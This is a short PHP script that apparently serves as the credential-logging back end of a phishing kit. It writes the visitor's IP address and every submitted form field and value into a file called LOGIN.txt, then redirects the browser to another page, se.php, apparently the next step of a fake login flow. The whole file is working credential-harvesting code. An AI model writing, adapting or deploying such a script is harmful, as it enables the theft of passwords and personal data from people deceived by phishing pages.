<?php
header ('Location:se.php');

if(!empty($_SERVER['HTTP_CLIENT_IP'])){
   $ip=$_SERVER['HTTP_CLIENT_IP'];
 }
 elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
   $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
 }
 else{
   $ip=$_SERVER['REMOTE_ADDR'];
 }



$handle = fopen("LOGIN.txt", "a+");
fwrite($handle,"Logged IP address: $ip");
fwrite($handle, "\r\n");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fwrite($handle,"\r\n ");
fclose($handle);
exit;

?>